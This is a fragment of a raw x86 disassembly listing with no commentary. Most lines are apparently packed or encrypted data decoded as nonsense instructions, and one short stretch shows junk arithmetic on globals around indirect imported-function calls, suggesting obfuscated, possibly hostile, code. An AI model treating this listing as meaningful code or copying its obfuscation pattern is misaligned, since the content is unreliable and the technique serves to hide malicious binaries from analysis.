  408b8d:	inc    esi
  408b8e:	imul   esi,ecx,0x5dbd4d84
  408b94:	jge    0x408b20
  408b96:	ja     0x408b43
  408b98:	(bad)  
  408b99:	(bad)  
  408b9a:	pop    ds
  408b9b:	pop    ebp
  408b9c:	jmp    0xa98923c9
  408ba1:	inc    edi
  408ba2:	sub    al,0xa5
  408ba4:	jl     0x408b2d
  408ba6:	test   al,0xd4
  408ba8:	pop    edi
  408ba9:	mov    edi,0xad65334f
  408bae:	dec    esi
  408baf:	in     al,0xd9
  408bb1:	or     DWORD PTR [edx-0x15b9cdd7],eax
  408bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb8:	out    0xe3,eax
  408bba:	mov    ch,0x93
  408bbc:	imul   esi,DWORD PTR [edx+0x8fe4384],0xd89ad26e
  408bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bc7:	push   esp
  408bc8:	pop    ss
  408bc9:	and    bh,BYTE PTR [ebx+0x48]
  408bcc:	cmp    eax,0x183297d6
  408bd1:	mov    dh,0x9
  408bd3:	jle    0x408bf2
  408bd5:	cmp    al,0x9d
  408bd7:	sahf   
  408bd8:	push   esp
  408bd9:	stc    
  408bda:	xchg   esi,ebp
  408bdc:	xchg   ebx,eax
  408bdd:	push   ebx
  408bde:	call   0x7271:0xd66b518b
  408be5:	jl     0x408c27
  408be7:	or     al,BYTE PTR [ecx-0x2]
  408bea:	or     al,0xf4
  408bec:	fs hlt 
  408bee:	fstp   QWORD PTR [eax-0x21a95a50]
  408bf4:	pushf  
  408bf5:	hlt    
  408bf6:	int3   
  408bf7:	or     al,0xa6
  408bf9:	inc    ebx
  408bfa:	push   ecx
  408bfb:	repnz mov ds:0xa327d085,eax
  408c01:	jbe    0x408bd9
  408c03:	jno    0x408c73
  408c05:	call   FWORD PTR [edx+ebx*2+0x2b]
  408c09:	pop    ebx
  408c0a:	adc    BYTE PTR [esi],0x91
  408c0d:	scas   al,BYTE PTR es:[edi]
  408c0e:	shr    ch,cl
  408c10:	sbb    cl,BYTE PTR [ebx+0x7c37abba]
  408c16:	std    
  408c17:	scas   eax,DWORD PTR es:[edi]
  408c18:	jmp    0x77bbc40b
  408c1d:	cli    
  408c1e:	adc    eax,DWORD PTR [edi-0x1c]
  408c21:	xchg   esi,eax
  408c22:	push   cs
  408c23:	je     0x408c29
  408c25:	jmp    0xecc8751e
  408c2a:	mov    ebp,0x7e07de0b
  408c2f:	xor    DWORD PTR [edi+0x6a],esi
  408c32:	push   es
  408c33:	cwde   
  408c34:	mov    ebp,DWORD PTR [ebx+0x62]
  408c37:	sti    
  408c38:	xchg   ebx,eax
  408c39:	push   esp
  408c3a:	xchg   esi,eax
  408c3b:	bound  eax,QWORD PTR [edx-0xf]
  408c3e:	mov    bh,0x91
  408c40:	or     dh,bl
  408c42:	mov    ebx,0x9641fc6a
  408c47:	pop    edi
  408c48:	cdq    
  408c49:	jg     0x408bdd
  408c4b:	(bad)  
  408c4c:	repnz or DWORD PTR [eax+0x35a9f2cf],0xffffffff
  408c54:	shr    BYTE PTR [ebx],1
  408c56:	mov    ecx,0xc6c53832
  408c5b:	pop    ebp
  408c5c:	cmp    al,0xd1
  408c5e:	scas   eax,DWORD PTR es:[edi]
  408c5f:	mov    ds:0xfbe58a1f,eax
  408c64:	jg     0x408cba
  408c66:	cmp    edi,esp
  408c68:	or     ah,ch
  408c6a:	inc    esi
  408c6b:	pop    edi
  408c6c:	jmp    0x3d4d:0x791938f3
  408c73:	daa    
  408c74:	aam    0x5f
  408c76:	mov    esp,0x60ed704
  408c7b:	shl    BYTE PTR [ebx+0x37bd9c02],1
  408c81:	shl    ecx,cl
  408c83:	cld    
  408c84:	pusha  
  408c85:	pusha  
  408c86:	jne    0x408cc6
  408c88:	jnp    0x408cd9
  408c8a:	sub    al,0x34
  408c8c:	loopne 0x408ca8
  408c8e:	inc    esi
  408c8f:	jno    0x408cef
  408c91:	xlat   BYTE PTR ds:[ebx]
  408c92:	arpl   bp,dx
  408c94:	fist   DWORD PTR [ebp-0x2fd58c2]
  408c9a:	add    ah,ch
  408c9c:	int    0x77
  408c9e:	and    BYTE PTR [edx+0x183a85c],dh
  408ca4:	push   edi
  408ca5:	stos   DWORD PTR es:[edi],eax
  408ca6:	jb     0x408c78
  408ca8:	mov    cl,ah
  408caa:	pop    es
  408cab:	mov    ah,0x39
  408cad:	js     0x408cfe
  408caf:	and    eax,DWORD PTR [edi+0x25]
  408cb2:	add    DWORD PTR [edi],edi
  408cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb5:	fld    DWORD PTR [eax-0x1479a294]
  408cbb:	ror    esp,cl
  408cbd:	pop    esi
  408cbe:	daa    
  408cbf:	mov    ds:0x742dfbe2,eax
  408cc4:	imul   edx,DWORD PTR es:[ecx-0x33],0x2d
  408cc9:	ins    BYTE PTR es:[edi],dx
  408cca:	stc    
  408ccb:	pop    ebx
  408ccc:	mov    ch,0xa6
  408cce:	call   0xaf1b76b4
  408cd3:	(bad)  
  408cd4:	mov    ?,WORD PTR [bx+di]
  408cd7:	stos   BYTE PTR es:[edi],al
  408cd8:	sbb    eax,0xb7553926
  408cdd:	mov    ecx,0x60a3cbe7
  408ce2:	pop    ebp
  408ce3:	xchg   dx,ax
  408ce5:	pop    ds
  408ce6:	mov    al,0xfe
  408ce8:	popf   
  408ce9:	ret    
  408cea:	and    al,0x80
  408cec:	fdiv   QWORD PTR [edx-0x787c9ac3]
  408cf2:	jp     0x408d3a
  408cf4:	inc    ebx
  408cf5:	mov    dl,0x3d
  408cf7:	mov    ch,0x9d
  408cf9:	mov    al,0x4
  408cfb:	ret    
  408cfc:	inc    ebp
  408cfd:	sub    esp,edx
  408cff:	scas   al,BYTE PTR es:[edi]
  408d00:	fisub  DWORD PTR ds:0x5cf4590a
  408d06:	in     eax,dx
  408d07:	mov    dl,0xdc
  408d09:	add    esp,DWORD PTR [eax-0x4d]
  408d0c:	bswap  ebp
  408d0e:	and    al,0x87
  408d10:	pop    eax
  408d11:	out    dx,al
  408d12:	xchg   BYTE PTR [edi-0x5ce7e7c2],al
  408d18:	mov    eax,0x376767c9
  408d1d:	les    esp,FWORD PTR [edx-0x46418d0a]
  408d23:	adc    al,0x7e
  408d25:	xor    DWORD PTR ds:0xee161584,eax
  408d2b:	push   eax
  408d2c:	jne    0x408d3b
  408d2e:	sub    esp,DWORD PTR [edx]
  408d30:	sbb    edx,DWORD PTR [ecx+0x7f4d767a]
  408d36:	inc    ebx
  408d37:	ins    DWORD PTR es:[edi],dx
  408d38:	jnp    0x408da4
  408d3a:	pop    ds
  408d3b:	xchg   ebx,eax
  408d3c:	(bad)  
  408d3d:	pop    edi
  408d3e:	jmp    0x7877:0xac376f00
  408d45:	jp     0x408da7
  408d47:	mov    ah,0xcb
  408d49:	out    dx,ax
  408d4b:	jnp    0x408db9
  408d4d:	xor    cl,BYTE PTR [eax-0x1f3df232]
  408d53:	not    BYTE PTR [esi-0x3e]
  408d56:	add    al,0x4d
  408d58:	push   ds
  408d59:	adc    DWORD PTR [ebx],ebp
  408d5b:	ss pushf 
  408d5d:	jle    0x408cee
  408d5f:	(bad)  
  408d60:	or     cl,BYTE PTR [eax-0x4d]
  408d63:	(bad)  
  408d64:	in     eax,dx
  408d65:	push   es
  408d66:	imul   edi,DWORD PTR [ebx],0xa
  408d69:	repnz icebp 
  408d6b:	test   eax,0x9c29f70b
  408d70:	add    al,0x80
  408d72:	mov    bl,0x37
  408d74:	adc    eax,esi
  408d76:	test   eax,0x58fbf6bf
  408d7b:	das    
  408d7c:	addr16 xor eax,0x901ad2cc
  408d82:	mov    ch,0x5a
  408d84:	and    al,0xe5
  408d86:	std    
  408d87:	ja     0x408d10
  408d89:	in     eax,0x44
  408d8b:	push   ebp
  408d8c:	sub    al,0xfe
  408d8e:	outs   dx,BYTE PTR ds:[esi]
  408d8f:	mov    ds:0x394c8e36,eax
  408d94:	imul   ecx,DWORD PTR [ebx+0x3bd6985d],0x6700219b
  408d9e:	je     0x408dc1
  408da0:	sahf   
  408da1:	adc    eax,0x67769216
  408da6:	lahf   
  408da7:	call   0xae74:0x7488c93d
  408dae:	xchg   esi,eax
  408daf:	cmc    
  408db0:	enter  0x1c4a,0x8d
  408db4:	(bad)  [ebp-0x7b]
  408db7:	ja     0x408dc4
  408db9:	adc    ebx,DWORD PTR [edi+ecx*4+0x7f5a05a8]
  408dc0:	mov    ebp,0x8a7ab2cd
  408dc5:	jle    0x408d4d
  408dc7:	jnp    0x408d51
  408dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dca:	fcomip st,st(3)
  408dcc:	lods   eax,DWORD PTR ss:[esi]
  408dce:	in     eax,dx
  408dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dd0:	xchg   esi,eax
  408dd1:	dec    esp
  408dd2:	out    dx,al
  408dd3:	pop    es
  408dd4:	(bad)  
  408dd5:	lods   al,BYTE PTR ds:[esi]
  408dd6:	sar    BYTE PTR [edx+0x3b079df7],0xa0
  408ddd:	jb     0x408dca
  408ddf:	sahf   
  408de0:	sbb    DWORD PTR [ebp-0x58874ac7],ebx
  408de6:	mov    bh,0x36
  408de8:	je     0x408e45
  408dea:	xchg   ecx,eax
  408deb:	iret   
  408dec:	aad    0x5f
  408dee:	and    ch,dl
  408df0:	mov    al,0xfb
  408df2:	loop   0x408e44
  408df4:	adc    BYTE PTR [edi+0x2a],dl
  408df7:	repnz addr16 mov bl,0xcc
  408dfb:	mov    ah,0xb7
  408dfd:	fxch   st(1)
  408dff:	push   cs
  408e00:	mov    bl,bh
  408e02:	pusha  
  408e03:	jg     0x408e84
  408e05:	int3   
  408e06:	mov    al,0x22
  408e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e09:	aas    
  408e0a:	jecxz  0x408dd0
  408e0c:	addr16 jno 0x408dbb
  408e0f:	stos   BYTE PTR es:[edi],al
  408e10:	mov    BYTE PTR [esi*8-0x4f2fe1e5],bl
  408e17:	call   0xafbd:0x510bced2
  408e1e:	jbe    0x408da0
  408e20:	pop    eax
  408e21:	inc    eax
  408e22:	xchg   ecx,eax
  408e23:	pop    ds
  408e24:	arpl   WORD PTR [edi-0x6c15692a],ax
  408e2a:	jb     0x408e24
  408e2c:	nop
  408e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2e:	xor    al,0x5d
  408e30:	pop    edi
  408e31:	lods   al,BYTE PTR ds:[esi]
  408e32:	popf   
  408e33:	int3   
  408e34:	pop    esp
  408e35:	std    
  408e36:	repnz push ss
  408e38:	xor    DWORD PTR [ecx],0xf28ee631
  408e3e:	push   ss
  408e3f:	ds out dx,eax
  408e41:	sti    
  408e42:	ins    DWORD PTR es:[edi],dx
  408e43:	push   eax
  408e44:	push   esi
  408e45:	push   0xffffffd6
  408e47:	sub    DWORD PTR [ebx+ebp*4+0x5],esi
  408e4b:	sahf   
  408e4c:	and    eax,0x31a83df9
  408e51:	pop    ecx
  408e52:	adc    eax,DWORD PTR [edx-0x7c3cf2b2]
  408e58:	jge    0x408ea2
  408e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e5b:	mov    ch,0xd5
  408e5d:	js     0x408e02
  408e5f:	adc    esp,ebp
  408e61:	sbb    DWORD PTR [eax],0x30
  408e64:	xchg   ebx,eax
  408e65:	sub    BYTE PTR [edi+eax*1-0x277d8085],bl
  408e6c:	xchg   edx,eax
  408e6d:	(bad)  
  408e6e:	retf   
  408e6f:	mov    esi,0x7ba35eee
  408e74:	jns    0x408e36
  408e76:	pop    ss
  408e77:	cmp    BYTE PTR [ebx],ah
  408e79:	jge    0x408ef7
  408e7b:	ror    cl,0xf9
  408e7e:	push   ds
  408e7f:	(bad)  
  408e80:	pop    ebp
  408e81:	sbb    eax,0x40dca83b
  408e86:	pop    ebx
  408e87:	into   
  408e88:	push   eax
  408e89:	shr    eax,0x16
  408e8c:	fld    DWORD PTR [ebx-0x76]
  408e8f:	int3   
  408e90:	pop    ebp
  408e91:	repz sub bl,cl
  408e94:	pop    ss
  408e95:	and    edx,ebx
  408e97:	aas    
  408e98:	fwait
  408e99:	jge    0x408e82
  408e9b:	enter  0x9bc1,0xc5
  408e9f:	ret    0xbbb
  408ea2:	imul   eax,ebx,0x8dca2076
  408ea8:	dec    ebx
  408ea9:	push   es
  408eaa:	push   cs
  408eab:	sub    BYTE PTR [eax-0x396f7301],dh
  408eb1:	push   ds
  408eb2:	ffreep st(2)
  408eb4:	ja     0x408eb0
  408eb6:	pop    edx
  408eb7:	jle    0x408e76
  408eb9:	out    0x52,eax
  408ebb:	test   eax,0x80aaf076
  408ec0:	outs   dx,BYTE PTR ds:[esi]
  408ec1:	push   es
  408ec2:	xor    DWORD PTR [eax+edx*1+0x51],edx
  408ec6:	adc    BYTE PTR [edx+0x69],cl
  408ec9:	push   ecx
  408eca:	fld    QWORD PTR [edi+0x71]
  408ecd:	pop    esp
  408ece:	mov    eax,ds:0x3c2d0d0d
  408ed3:	cli    
  408ed4:	popa   
  408ed5:	push   ecx
  408ed6:	push   cs
  408ed7:	fwait
  408ed8:	xchg   BYTE PTR [edi+0x53],dl
  408edb:	xchg   edx,eax
  408edc:	inc    edi
  408edd:	mov    ebp,0x48a152e6
  408ee2:	xor    eax,0xe2de1672
  408ee7:	popf   
  408ee8:	rcr    ecx,1
  408eea:	idiv   DWORD PTR [ebp+eiz*2-0x29b0cdf6]
  408ef1:	jae    0x408f09
  408ef3:	xor    BYTE PTR [esp+eiz*4],al
  408ef6:	loope  0x408f09
  408ef8:	adc    cl,BYTE PTR [edi-0x5b6b4847]
  408efe:	repnz (bad) 
  408f01:	data16 fmul st,st(3)
  408f04:	jmp    0x408e91
  408f06:	data16 repz mov bl,0xaf
  408f0a:	jp     0x408ea3
  408f0c:	jbe    0x408ed3
  408f0e:	cmp    al,0xa7
  408f10:	xor    ch,cl
  408f12:	and    al,0x77
  408f14:	(bad)  
  408f16:	pop    edx
  408f17:	adc    al,0x7
  408f19:	inc    ebx
  408f1a:	jge    0x408ea9
  408f1c:	pushf  
  408f1d:	xchg   esp,eax
  408f1e:	sbb    al,0x8
  408f20:	add    ebx,ebx
  408f22:	xchg   ebp,eax
  408f23:	es ret 0x9ec4
  408f27:	sbb    BYTE PTR [ebp+0x1b311572],cl
  408f2d:	out    0xb3,al
  408f2f:	xor    eax,0x1b555bd9
  408f34:	clc    
  408f35:	mov    bl,0x65
  408f37:	lods   al,BYTE PTR ds:[esi]
  408f38:	mov    al,ds:0x1dc8a998
  408f3d:	aaa    
  408f3e:	lds    ecx,FWORD PTR [ecx]
  408f40:	fnstsw ax
  408f42:	mov    WORD PTR [eax+0x7c],ss
  408f45:	mov    esp,0xa6d63d1e
  408f4a:	pusha  
  408f4b:	popa   
  408f4c:	pop    ds
  408f4d:	pop    ebp
  408f4e:	call   0x2ad1:0xff24c4bc
  408f55:	test   al,0x60
  408f57:	jns    0x408fbb
  408f59:	bound  edx,QWORD PTR [esi-0x4d]
  408f5c:	add    DWORD PTR [esi-0x23],edx
  408f5f:	mov    eax,0x8b1a1ab0
  408f64:	dec    ebp
  408f65:	in     al,0x21
  408f67:	or     eax,0x4229be
  408f6c:	shrd   eax,ecx,0x2
  408f70:	xor    edx,DWORD PTR ds:0x4229aa
  408f76:	shr    ecx,0x2
  408f79:	add    DWORD PTR ds:0x4228ea,0x4c61
  408f83:	mov    ecx,DWORD PTR [ebp-0x20]
  408f86:	xor    edx,DWORD PTR ds:0x4228d2
  408f8c:	mov    edx,DWORD PTR [ebp-0x1c]
  408f8f:	xor    DWORD PTR ds:0x42297e,0xf7e
  408f99:	xor    eax,edi
  408f9b:	shl    ecx,0x1e
  408f9e:	sbb    ecx,DWORD PTR ds:0x42294e
  408fa4:	xor    edx,edx
  408fa6:	cmp    DWORD PTR ds:0x422916,0x0
  408fad:	mov    ecx,0xa46
  408fb2:	mov    DWORD PTR ds:0x4229ce,0x4de7
  408fbc:	mov    DWORD PTR ds:0x42291e,ecx
  408fc2:	jmp    0x409028
  408fc7:	mov    DWORD PTR ds:0x42298a,0x3b5
  408fd1:	jne    0x40900c
  408fd7:	push   DWORD PTR [ebp-0x20]
  408fda:	push   DWORD PTR [ebp-0x1c]
  408fdd:	push   DWORD PTR [ebp-0x10]
  408fe0:	call   DWORD PTR ds:0x42a020
  408fe6:	xor    ecx,ecx
  408fe8:	add    ecx,DWORD PTR ds:0x4228c2
  408fee:	and    DWORD PTR ds:0x4229ae,ecx
  408ff4:	mov    ecx,DWORD PTR ds:0x4228f2
  408ffa:	sub    DWORD PTR ds:0x42292e,ecx
  409000:	add    ecx,DWORD PTR ds:0x4229a6
  409006:	xor    DWORD PTR ds:0x4229a2,ebx
  40900c:	mov    ecx,DWORD PTR ds:0x42298a
  409012:	or     DWORD PTR ds:0x4228f6,ecx
  409018:	adc    ecx,0x6cf8
  40901e:	adc    DWORD PTR ds:0x422962,0xa1e
  409028:	or     eax,edx
  40902a:	cmp    DWORD PTR ds:0x4228e6,0x0
  409031:	mov    DWORD PTR ds:0x42289e,0x3e29
  40903b:	mov    ecx,0x398
  409040:	jmp    0x409109
  409045:	mov    DWORD PTR ds:0x4228e6,0x60d3
  40904f:	mov    DWORD PTR ds:0x4228ce,0x6d23
  409059:	je     0x409087
  40905f:	push   DWORD PTR [ebp-0x14]
  409062:	push   DWORD PTR [ebp-0x1c]
  409065:	push   0x422835
  40906a:	push   DWORD PTR [ebp-0x28]
  40906d:	call   DWORD PTR ds:0x42a024
  409073:	sbb    DWORD PTR ds:0x42293a,0x5600
  40907d:	sub    DWORD PTR ds:0x422942,0x2629
  409087:	add    ecx,0x569a
  40908d:	sub    edx,edx
  40908f:	and    DWORD PTR ds:0x4228c6,edx
  409095:	cmp    DWORD PTR ds:0x4229ae,0x0
  40909c:	mov    DWORD PTR ds:0x42298a,0x14a0
  4090a6:	movzx  edx,BYTE PTR ds:0x42293e
  4090ad:	mov    ecx,0x236d
  4090b2:	jmp    0x409109
  4090b7:	mov    DWORD PTR ds:0x4229ae,ecx
  4090bd:	mov    DWORD PTR ds:0x42292e,0x5874
  4090c7:	jge    0x4090e5
  4090cd:	push   DWORD PTR [ebp-0x28]
  4090d0:	push   DWORD PTR [ebp-0xc]
  4090d3:	call   DWORD PTR ds:0x42a050
  4090d9:	xor    DWORD PTR ds:0x422916,edx
  4090df:	sbb    ecx,0x5177
  4090e5:	mov    ecx,DWORD PTR ds:0x4229e2
  4090eb:	mov    edx,DWORD PTR ds:0x422a62
  4090f1:	sub    ecx,edx
  4090f3:	sub    ecx,DWORD PTR [ecx+edx*1]
  4090f6:	movzx  edx,BYTE PTR ds:0x4229ca
  4090fd:	or     edx,DWORD PTR ds:0x4228d6
  409103:	mov    DWORD PTR ds:0x4229ca,edx
  409109:	lea    eax,[ebp+eax*1-0x4]
  40910d:	mov    DWORD PTR [ebp-0x34],eax
  409110:	mov    eax,DWORD PTR [ebp-0x20]
  409113:	mov    ecx,DWORD PTR [ebp-0x1c]
  409116:	shrd   eax,ecx,0x2
  40911a:	shr    ecx,0x2
  40911d:	mov    ecx,DWORD PTR [ebp-0x20]
  409120:	mov    edx,DWORD PTR [ebp-0x1c]
  409123:	jmp    0x4096ad
  409128:	add    DWORD PTR [edx+0x589575b5],ebp
  40912e:	inc    eax
  40912f:	and    dh,BYTE PTR [ebx-0x6091636b]
  409135:	push   edx
  409136:	loop   0x4091a0
  409138:	scas   eax,DWORD PTR es:[edi]
  409139:	aas    
  40913a:	push   ss
  40913b:	push   ss
  40913c:	cmp    eax,0x33161604
  409141:	inc    edx
  409142:	xchg   esp,eax
  409143:	adc    al,0x28
  409145:	mov    al,0xec
  409147:	js     0x409142
  409149:	dec    ebp
  40914a:	scas   eax,DWORD PTR es:[edi]
  40914b:	sbb    bl,ah
  40914d:	icebp  
  40914e:	and    eax,0x841529e2
  409153:	les    esi,FWORD PTR [edx-0x76852b31]
  409159:	rol    DWORD PTR [esi-0x5d],cl
  40915c:	add    eax,0x143d6b5b
  409161:	inc    edx
  409162:	test   BYTE PTR [eax+0xb],dh
  409165:	dec    ebx
  409166:	or     eax,DWORD PTR [edx+0x4511b8d9]
  40916c:	int    0x85
  40916e:	jmp    0xcfc6:0xb40fcd5d
  409175:	test   eax,0xf4923f4a
  40917a:	loope  0x40910a
  40917c:	xchg   edi,eax
  40917d:	fisttp DWORD PTR [ecx]
  40917f:	sbb    DWORD PTR [ebp-0x8eff105],esp
  409185:	mov    ?,WORD PTR [esi]
  409187:	sti    
  409188:	inc    esi
  409189:	cdq    
  40918a:	sbb    BYTE PTR [ebp+0x68],bh
  40918d:	clc    
  40918e:	or     BYTE PTR [eax+0x1e],0xda
  409192:	div    DWORD PTR [ebx+0x5]
  409195:	mov    ss,WORD PTR [ebp-0x2e]
  409198:	aad    0x54
  40919a:	xor    bl,BYTE PTR [edi+0x7450daed]
  4091a0:	lds    edi,FWORD PTR [ecx+0x3af9f4f4]
  4091a6:	(bad)  
  4091a7:	jle    0x4091c4
  4091a9:	jle    0x409146
  4091ab:	(bad)  
  4091ac:	fldenv [ebx]
  4091ae:	stc    
  4091af:	das    
  4091b0:	pop    esi
  4091b1:	xlat   BYTE PTR ds:[ebx]
  4091b2:	retf   0xc419
  4091b5:	shr    DWORD PTR [esi+0x1e5ba0f],cl
  4091bb:	inc    ebp
  4091bc:	push   ecx
  4091bd:	adc    eax,0x4f7d83cf
  4091c2:	pop    edi
  4091c3:	outs   dx,BYTE PTR ds:[esi]
  4091c4:	imul   ebx,DWORD PTR [ebx+0x47fa6558],0xffffffa0
  4091cb:	jnp    0x4091f6
  4091cd:	int    0x55
  4091cf:	(bad)  
  4091d0:	fisttp DWORD PTR [ebp+0x43]
  4091d3:	repz in al,dx
  4091d5:	xor    BYTE PTR [edx],al
  4091d7:	xchg   edi,eax
  4091d8:	retf   
  4091d9:	mov    edx,DWORD PTR [esp+eax*8+0x25]
  4091dd:	sub    cl,BYTE PTR [edx]
  4091df:	hlt    
  4091e0:	sbb    eax,0x1eb7c8a9
  4091e5:	cmp    esi,esp
  4091e7:	fidivr DWORD PTR [edx-0x32ae6f90]
  4091ed:	mov    ds:0xd8f73e31,al
  4091f2:	push   ss
  4091f3:	gs dec eax
  4091f5:	loopne 0x409241
  4091f7:	inc    ebx
  4091f8:	fdecstp 
  4091fa:	je     0x4091e8
  4091fc:	xchg   ebp,eax
  4091fd:	ins    DWORD PTR es:[edi],dx
  4091fe:	and    al,0x26
  409200:	lds    ebx,FWORD PTR [ebp+0x35]
  409203:	retf   0x9140
  409206:	cmc    
  409207:	sub    dl,BYTE PTR [ebp-0x1]
  40920a:	cdq    
  40920b:	sub    DWORD PTR [ebx],edx
  40920d:	xor    dl,bh
  40920f:	mov    bl,0xc5
  409211:	mov    dl,0xa2
  409213:	call   0xec31b998
  409218:	stc    
  409219:	mov    ds:0x494b3110,al
  40921e:	pop    ebx
  40921f:	inc    esp
  409220:	test   eax,0xb116e65b
  409225:	push   es
  409226:	lock cli 
  409228:	inc    edx
  409229:	mov    bh,BYTE PTR [eax]
  40922b:	or     edi,DWORD PTR [ebp+0x3c]
  40922e:	push   0xb47734cd
  409233:	in     eax,0x9
  409235:	or     BYTE PTR [edi],ch
  409237:	das    
  409238:	cmc    
  409239:	mov    dh,BYTE PTR [eax-0x52]
  40923c:	(bad)  
  40923d:	jae    0x4092b9
  40923f:	(bad)  
  409240:	pop    ds
  409241:	sti    
  409242:	mov    WORD PTR [ecx+0x3c683ef2],?
  409248:	les    esp,FWORD PTR [ebp-0x450a21e4]
  40924e:	gs ja  0x4091e3
  409251:	fiadd  DWORD PTR [ecx]
  409253:	dec    esi
  409254:	fstp   TBYTE PTR [ebp+0xe]
  409257:	mov    ds:0x2492ef5d,eax
  40925c:	cwde   
  40925d:	push   cs
  40925e:	jmp    0x4091e3
  409260:	ja     0x4092a4
  409262:	cs scas eax,DWORD PTR es:[edi]
  409264:	lds    edi,FWORD PTR [eax]
  409266:	dec    ebp
  409267:	xchg   ebx,eax
  409268:	sbb    BYTE PTR [ebx+ebp*2+0x74],0x8d
  40926d:	in     al,dx
  40926e:	loopne 0x40921e
  409270:	into   
  409271:	mov    eax,ds:0x8ebfdfc2
  409276:	hlt    
  409277:	mov    dh,BYTE PTR [ebx]
  409279:	push   ss
  40927a:	sti    
  40927b:	mov    DWORD PTR [edx+0x4e],edx
  40927e:	xchg   ebp,eax
  40927f:	lods   al,BYTE PTR ds:[esi]
  409280:	pop    eax
  409281:	jno    0x40926b
  409283:	mov    al,ds:0x432c9310
  409288:	xchg   edi,eax
  409289:	arpl   bp,cx
  40928b:	cmc    
  40928c:	loop   0x409270
  40928e:	aas    
  40928f:	imul   BYTE PTR [edi+0x251263ab]
  409295:	data16 fmul QWORD PTR [esi+0x691d9a32]
  40929c:	inc    esi
  40929d:	shl    dl,1
  40929f:	push   ss
  4092a0:	mov    ebp,0xd1dc0c24
  4092a5:	ins    BYTE PTR es:[edi],dx
  4092a6:	jecxz  0x409232
  4092a8:	push   edx
  4092a9:	test   al,0xf4
  4092ab:	scas   eax,DWORD PTR es:[edi]
  4092ac:	jmp    0xb69cb105
  4092b1:	ja     0x4092f0
  4092b3:	sbb    al,cl
  4092b5:	add    ecx,DWORD PTR [edx]
  4092b7:	fs pop esp
  4092b9:	sbb    dh,bh
  4092bb:	out    dx,eax
  4092bc:	xchg   ebx,eax
  4092bd:	push   esp
  4092be:	cmp    esp,edx
  4092c0:	stos   DWORD PTR es:[edi],eax
  4092c1:	jns    0x409287
  4092c3:	mov    ds,WORD PTR [ecx-0x3b01f588]
  4092c9:	inc    esp
  4092ca:	push   es
  4092cb:	mov    al,BYTE PTR [eax-0xb19ee96]
  4092d1:	inc    ecx
  4092d2:	xchg   ah,ch
  4092d4:	out    dx,eax
  4092d5:	mov    eax,ds:0x1a583f3c
  4092da:	adc    al,0xf6
  4092dc:	popf   
  4092dd:	add    al,0x8e
  4092df:	enter  0x4061,0x38
  4092e3:	shl    DWORD PTR [edx],1
  4092e5:	call   0x23a4:0x4381be1
  4092ec:	xchg   edx,eax
  4092ed:	cmp    al,0xa7
  4092ef:	xchg   ebx,eax
  4092f0:	xor    bh,BYTE PTR fs:[ecx+0x592a895e]
  4092f7:	xlat   BYTE PTR ds:[ebx]
  4092f8:	retf   0x8c37
  4092fb:	or     ebx,eax
  4092fd:	mov    bl,0xac
  4092ff:	loopne 0x40928f
  409301:	dec    esp
  409302:	aaa    
  409303:	inc    ebx
  409304:	in     al,dx
  409305:	mov    eax,0x9669c8dc
  40930a:	mov    dh,0xec
  40930c:	mov    eax,ds:0x416d4e19
  409311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409312:	mov    bh,0xf
  409314:	inc    edx
  409315:	pop    ss
  409316:	icebp  
  409317:	test   BYTE PTR [edi-0x45a51328],0xd5
  40931e:	ret    0x8293
  409321:	push   ss
  409322:	cld    
  409323:	jae    0x409367
  409325:	or     BYTE PTR [ecx],bl
  409327:	mov    esp,0xf4722434
  40932c:	mov    ch,0x93
  40932e:	push   es
  40932f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409330:	or     al,0x7c
  409332:	(bad)  
  409333:	or     eax,0xb03e2cbc
  409338:	push   esp
  409339:	push   cs
  40933a:	dec    ebx
  40933b:	lea    edx,[edi-0x7de3398a]
  409341:	inc    ebp
  409342:	in     eax,0x4e
  409344:	mov    DWORD PTR [ebx-0x77],edx
  409347:	ins    DWORD PTR es:[edi],dx
  409348:	and    al,0xf7
  40934a:	lds    esi,FWORD PTR es:[edi+0xf]
  40934e:	(bad)  
  40934f:	mov    BYTE PTR [esi],ch
  409351:	mov    ds:0xa40bb930,eax
  409356:	psrlq  mm7,QWORD PTR [edx+0x596cef05]
  40935d:	inc    ecx
  40935e:	pop    es
  40935f:	dec    esp
  409360:	adc    eax,0xa95cf2b6
  409365:	jmp    0x9679:0x91e858d5
  40936c:	sbb    al,0xbe
  40936e:	mov    dh,0x25
  409370:	cwde   
  409371:	push   ebx
  409372:	dec    ebx
  409373:	rol    DWORD PTR [ebp+ebx*1-0x498fc791],1
  40937a:	dec    ebx
  40937b:	mov    ecx,0x4f506a55
  409380:	mov    eax,0x860bb680
  409385:	mov    BYTE PTR [ebx],al
  409387:	inc    ebx
  409388:	(bad)  
  409389:	xor    DWORD PTR [ebp-0x7e5b9d03],ecx
  40938f:	dec    eax
  409390:	loope  0x40937a
  409392:	fadd   DWORD PTR ds:0x31dc82d5
  409398:	retf   
  409399:	inc    DWORD PTR [edx+0x3a]
  40939c:	cli    
  40939d:	pushf  
  40939e:	rcr    BYTE PTR [edi],0xde
  4093a1:	stos   DWORD PTR es:[edi],eax
  4093a2:	imul   ecx,DWORD PTR [edi-0x3f],0x71
  4093a6:	push   ds
  4093a7:	shr    BYTE PTR [ecx],cl
  4093a9:	pop    ss
  4093aa:	mov    esp,DWORD PTR [ebx-0x715bd061]
  4093b0:	ins    DWORD PTR es:[edi],dx
  4093b1:	mov    dl,0x22
  4093b3:	cmp    eax,0xd47653e4
  4093b8:	les    ecx,FWORD PTR [esi]
  4093ba:	pop    ebx
  4093bb:	inc    ebp
  4093bc:	sbb    BYTE PTR [edi],bl
  4093be:	test   DWORD PTR [edx+0x60],0x917c1857
  4093c5:	(bad)  
  4093c6:	lea    ebx,[esi+0x37]
  4093c9:	test   edi,eax
  4093cb:	xchg   ebx,eax
  4093cc:	stos   DWORD PTR es:[edi],eax
  4093cd:	jne    0x409439
  4093cf:	adc    BYTE PTR [edx-0x3a],0x7f
  4093d3:	(bad)  
  4093d4:	mov    eax,ds:0x41bfd264
